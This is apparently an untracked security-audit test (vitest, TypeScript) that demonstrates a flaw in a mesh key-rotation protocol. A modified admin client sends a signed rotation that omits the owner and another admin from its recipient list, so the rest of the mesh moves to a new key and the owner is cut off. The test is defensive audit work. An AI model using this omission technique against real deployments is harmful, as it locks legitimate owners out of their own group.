// ROUND-3 AUDIT PoC (untracked, delete after): a rotation's `to` list is never checked; an admin evicts the OWNER
// (whom it may not revoke) from the key by leaving it out of an otherwise valid rotation.
import { describe, expect, it } from "vitest";
import { signRevocation } from "../../../../../src/web/admission.js";
import type { PeerLink } from "../../../../../src/web/index.js";
import { createLoopbackHub } from "../../../../../src/web/index.js";
import { rotationId, wrapMeshKey } from "../../../../../src/web/rotation.js";
import { b64uDecode, b64uEncode, randomBytes, utf8 } from "../../../../../src/web/util.js";
import { type Dev, makeDev, kexKnown, metaOf, pair, until } from "../../../../../tests/web/helpers.js";
import { rawPeer } from "../ronda-3/zz-r3-lib.js";

const settle = (ms = 200) => new Promise((r) => setTimeout(r, ms));
const keyOf = (d: Dev) => b64uEncode(d.vault.meshKey as Uint8Array);

describe("R3 omission", () => {
	it("OM1: admin x1 revokes member m1 but leaves the owner (and admin x2) out of `to`: everybody else adopts, the owner is stranded", async () => {
		const hub = createLoopbackHub();
		const a = await makeDev("devA", hub);
		a.mesh.on("sas", (p) => p.confirm());
		const adm: Dev[] = [];
		for (const n of ["x1", "x2"]) {
			const d = await makeDev(n, hub);
			const o = await a.mesh.pairHost({ role: "admin" });
			await d.mesh.pairJoin(o.payload, { confirmSas: () => true });
			adm.push(d);
		}
		const [x1, x2] = adm as [Dev, Dev];
		const m1 = await makeDev("m1", hub);
		const c = await makeDev("devC", hub);
		await pair(a, m1);
		await pair(a, c);
		const all = [a, x1, x2, m1, c];
		await until(
			() => all.every((d) => all.every((y) => kexKnown(d, y.id))) && all.every((d) => d.mesh.devices().length === 5),
			8000,
		);
		const k0 = (x1.vault.meshKey as Uint8Array).slice();
		const instance = a.mesh.namespace.split("/")[1] as string;
		const mid = a.mesh.root?.mid as string;
		x1.mesh.destroy(); // x1 now speaks raw (modified client)
		// a valid revocation of a member (x1 may revoke members), at epoch 1
		const rev = await signRevocation(x1.vault, { mid, target: m1.id, by: x1.id, epoch: 1 });
		const to = [c.id].sort(); // NOT the owner, NOT admin x2
		const rec = { v: 1 as const, epoch: 1, from: x1.id, revoked: [m1.id], to, n: b64uEncode(randomBytes(16)), revs: [rev] };
		const id = await rotationId(rec);
		const newKey = randomBytes(32);
		const priv = (await x1.vault.getEcdhIdentity()).privateKey;
		const wraps: Record<string, string> = {};
		for (const t of to) wraps[t] = await wrapMeshKey(priv, b64uDecode(metaOf(a).get(`ecdh/${t}`).pub), id, x1.id, t, newKey);
		const t = hub.transport("evil");
		const lks: PeerLink[] = [];
		const peers: Array<Promise<Awaited<ReturnType<typeof rawPeer>>>> = [];
		t.onLink((l) => {
			lks.push(l);
			peers.push(rawPeer(x1.vault, k0, 0, l, instance));
		});
		const { deriveRoomId } = await import("../../../../../src/web/index.js");
		await t.join(await deriveRoomId(k0, "fize", "fize/data/r1", 0, instance), x1.id);
		await until(() => lks.length >= 4);
		for (const [i, l] of lks.entries()) {
			const p = await (peers[i] as Promise<Awaited<ReturnType<typeof rawPeer>>>);
			await until(() => p.isAuthed(), 2000).catch(() => {});
			if (to.includes(l.id)) await p.send(3, utf8(JSON.stringify({ rot: rec, to: l.id, wrap: wraps[l.id], wraps })));
		}
		await settle(2000);
		console.log(
			`OM1 epochs: owner ${a.mesh.epoch} x2 ${x2.mesh.epoch} C ${c.mesh.epoch} m1 ${m1.mesh.epoch}; C on new key ${keyOf(c) === b64uEncode(newKey)}; owner on new key ${keyOf(a) === b64uEncode(newKey)}; C peers ${c.mesh.peers.length}; owner peers ${a.mesh.peers.length}; owner still lists C,x2: ${a.mesh.devices().length}`,
		);
		expect(c.mesh.epoch).toBe(1); // C adopted a rotation that dropped the owner and admin x2
		expect(keyOf(c)).toBe(b64uEncode(newKey));
		expect(a.mesh.epoch).toBe(0); // ATTACK: the owner is off the key (an admin cannot revoke the owner, but it can omit it)
		for (const d of all) d.mesh.destroy();
		t.close();
	}, 30_000);
});
